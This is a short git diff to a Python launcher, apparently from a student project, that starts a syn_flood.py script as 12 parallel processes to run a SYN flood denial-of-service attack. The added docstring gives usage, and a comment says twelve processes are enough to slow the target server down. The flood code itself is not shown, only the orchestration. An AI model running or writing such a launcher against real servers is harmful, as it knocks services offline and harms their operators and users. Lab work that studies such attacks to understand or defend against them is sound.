@@ -3,6 +3,10 @@ Luyckx Marco 496283
 Bouhnine Ayoub 500048
 
 SYN flood
+
+This script will run the syn_flood.py script 12 times in parallel. For more information, see the README.md file.
+
+Usage : python3 main.py
 """
 import subprocess
 import time
@@ -10,7 +14,8 @@ import os
 
 # Function to run a command with Popen and store the process in a list
 def run_ddos_syn_flood(command, process_list):
-    for i in range(12):
+    number_of_processes = 12
+    for i in range(number_of_processes): # 12 is an arbitrary number but it is enough to make the server slows down
         print("[+] Starting Syn Flood Attack id: {}".format(i))
         process = subprocess.Popen(command)
         process_list.append(process)
